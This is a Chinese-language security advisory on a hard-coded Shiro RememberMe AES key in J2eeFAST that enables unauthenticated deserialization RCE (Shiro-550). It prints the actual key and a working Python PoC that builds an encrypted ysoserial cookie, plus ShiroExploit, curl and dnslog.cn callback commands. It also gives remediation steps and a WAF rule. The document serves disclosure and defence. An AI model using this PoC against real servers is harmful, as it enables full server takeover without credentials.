# V-J011: J2eeFast Shiro 硬编码 RememberMe AES 密钥反序列化 RCE

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | J2eeFAST 快速开发平台 |
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-321: 使用硬编码加密密钥 / CWE-502: 不受信任数据的反序列化 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（完全未授权）|
| 参考 | Shiro-550 / CVE-2016-4437 |
| 代码仓库 | https://gitee.com/zhouhuan/J2EEFAST |

## 漏洞描述

J2eeFast 使用 Apache Shiro 框架，其 `CookieRememberMeManager` 的 AES 加密密钥在 `ShiroConfig.java` 中被硬编码：

```java
public CookieRememberMeManager rememberMeManager() {
    CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();
    cookieRememberMeManager.setCookie(rememberMeCookie());
    cookieRememberMeManager.setCipherKey(Base64.decode("fCq+/xW488hMTCD+cmJ3aQ=="));
    return cookieRememberMeManager;
}
```

由于该密钥随开源代码公开，攻击者可构造任意 Java 反序列化 payload（例如 CommonsBeanutils / CommonsCollections gadget），使用公开的 AES 密钥加密后塞入 `rememberMe` Cookie，Shiro 在处理"记住我"时会解密 + 反序列化该 Cookie，直接触发 RCE。

该类漏洞即为著名的 **Shiro-550 / CVE-2016-4437**，利用门槛极低，有成熟的 ShiroExploit 工具。

## 漏洞详情

### 根本原因

`CipherKey` 是 Shiro `AesCipherService` 的对称加密密钥；硬编码的 16 字节密钥长期未变更，任何部署该项目的系统都使用相同密钥。

### 反序列化链

项目依赖可根据 `pom.xml` 分析，常见可用链：

- `CommonsCollections1-7`（依赖 commons-collections 3.x/4.x）
- `CommonsBeanutils1`（项目通常自带）
- `JRMP/URLDNS`（用于不可出网环境的探测）

### 利用流程

1. 构造 ObjectInputStream 反序列化 payload（ysoserial / ShiroExploit）
2. 使用 AES-CBC + 公开密钥加密
3. 结合 Base64 + rememberMe Cookie 头发送
4. Shiro 未认证用户请求时也会处理 rememberMe → 反序列化 → RCE

## 概念验证

### 使用 ShiroExploit

```bash
# 使用公开工具 ShiroExploit 快速利用
java -jar ShiroExploit.jar
# Key: fCq+/xW488hMTCD+cmJ3aQ==
# Target URL: http://<target>/
# Gadget: CommonsBeanutils1
# Command: id
```

### 手工构造 Python PoC

```python
import base64, uuid, subprocess
from Crypto.Cipher import AES

def encode_rememberme(payload_bytes, key):
    # AES/CBC/PKCS5
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    iv = uuid.uuid4().bytes
    enc = AES.new(base64.b64decode(key), AES.MODE_CBC, iv).encrypt(pad(payload_bytes))
    return base64.b64encode(iv + enc).decode()

# 1) 使用 ysoserial 生成反序列化载荷
# java -jar ysoserial.jar CommonsBeanutils1 "id" > payload.bin
with open("payload.bin", "rb") as f:
    payload = f.read()

cookie = encode_rememberme(payload, "fCq+/xW488hMTCD+cmJ3aQ==")
print("rememberMe=" + cookie)
```

### 验证请求

```bash
curl -v -b "rememberMe=<encoded_payload>" http://<target>/
# 响应包含 Set-Cookie: rememberMe=deleteMe 表示反序列化已触发
# 目标服务器上已执行 `id` 命令
```

### 盲打反连

使用 URLDNS 链 + 公网 DNS Logger 确认命中：
```bash
java -jar ysoserial.jar URLDNS "http://<unique>.dnslog.cn" > payload.bin
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `fast-framework/.../config/ShiroConfig.java` | 258 | `setCipherKey(Base64.decode("fCq+/xW488hMTCD+cmJ3aQ=="))` |
| `pom.xml` | - | 引入 Shiro + commons-beanutils / commons-collections |

## 影响

1. **未授权 RCE**：无需任何凭证、无需用户交互，直接在服务器获得命令执行
2. **完全沦陷**：可写文件、读数据库配置、下载内网数据、横移
3. **通用性高**：所有部署该项目且未更换密钥的系统均受影响
4. **已有成熟工具**：ShiroExploit、ShiroAttack 等自动化工具直接可用
5. **审计隐蔽**：Shiro 解密失败会直接吞异常，不留 ERROR 日志

## 修复建议

1. **立即替换密钥**：生成 16 字节随机值，从环境变量加载
   ```java
   String key = System.getenv("SHIRO_REMEMBERME_KEY");
   cookieRememberMeManager.setCipherKey(Base64.decode(key));
   ```
2. **升级 Shiro ≥ 1.4.2**：启用默认 GCM 模式 + 随机密钥生成
3. **关闭 RememberMe**：若业务不需要，直接不注册 `CookieRememberMeManager`
4. **部署 WAF 规则**：拦截超长 `rememberMe` Cookie 和疑似序列化魔数 `rO0AB`
5. **清除历史依赖**：移除 `commons-beanutils` / `commons-collections` 不必要的旧版本

## 参考

- Apache Shiro 官方公告：https://shiro.apache.org/security.html
- CVE-2016-4437
- ysoserial: https://github.com/frohoff/ysoserial

## 验证环境

- 源代码：J2eeFast 最新分支（静态代码分析）
- 框架：Spring Boot + Apache Shiro
- 日期：2026-04-14
